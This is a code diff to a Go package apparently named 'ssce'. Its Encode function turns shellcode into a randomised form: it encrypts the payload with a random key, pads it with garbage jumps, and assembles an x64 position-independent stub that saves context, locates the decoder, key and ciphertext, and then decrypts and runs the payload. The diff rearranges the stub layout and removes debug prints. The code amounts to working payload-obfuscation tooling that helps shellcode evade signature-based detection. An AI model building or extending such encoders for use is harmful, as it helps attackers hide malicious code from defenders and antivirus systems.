@@ -1,6 +1,7 @@
 package ssce
 
 import (
+	"encoding/binary"
 	"errors"
 	"fmt"
 	"math/rand"
@@ -50,13 +51,20 @@ func NewEncoder(arch int) (*Encoder, error) {
 // Encode is used to encode input shellcode to a unique shellcode.
 func (e *Encoder) Encode(shellcode []byte) ([]byte, error) {
 	key := e.randBytes(32)
-	iv := e.randBytes(16)
-	cipher := encrypt(append(iv, shellcode...), key)
+	cipher := encrypt(shellcode, key)
 
 	output := make([]byte, 0, 1024+len(shellcode))
 	output = append(output, e.genGarbageJumpShort(64)...)
 	output = append(output, e.saveContext()...)
 	restore := e.restoreContext()
+
+	call0 := make([]byte, 1+4)
+	call0[0] = 0xE8
+	binary.LittleEndian.PutUint32(call0[1:], uint32(5+len(restore)+1))
+
+	call1 := make([]byte, 1+4)
+	call1[0] = 0xE8
+	binary.LittleEndian.PutUint32(call1[1:], uint32(len(restore)+1+len(x64Decoder)))
 
 	src := `
 .code64
@@ -69,32 +77,28 @@ get_rip:
   push rbx
   ret
 next:
-  lea rcx, [rbx + decoder + %X]
-  mov rdx, %X
-  mov r8,  [rbx + decoder + %X]
-  mov r9, %X
-  call decoder
-decoder:
+  lea rcx, [rbx + EOF - 5 + 0x%X]
+  mov rdx, 0x%X
+  lea r8, [rbx + EOF - 5 + 0x%X]
+  mov r9, 0x%X
+EOF:
 `
-
-	src = fmt.Sprintf(src, len(x64Decoder), len(cipher), len(x64Decoder), len(key))
-
-	fmt.Println(src)
+	cipherPtr := len(call0) + len(call1) + len(restore) + 1 + len(x64Decoder)
+	keyPtr := len(call0) + len(call1) + len(restore) + 1 + len(x64Decoder) + len(cipher)
+	src = fmt.Sprintf(src, cipherPtr, len(cipher), keyPtr, len(key))
 
 	inst, err := e.engine.Assemble(src, 0)
 	if err != nil {
 		return nil, err
 	}
-	fmt.Println(inst)
-
 	output = append(output, inst...)
-
-	output = append(output, x64Decoder...)
-
+	output = append(output, call0...)
+	output = append(output, call1...)
 	output = append(output, restore...)
-
-	output = append(output, key...)
+	output = append(output, 0xC3)
+	output = append(output, x64Decoder...)
 	output = append(output, cipher...)
+	output = append(output, key...)
 	return output, nil
 }
 
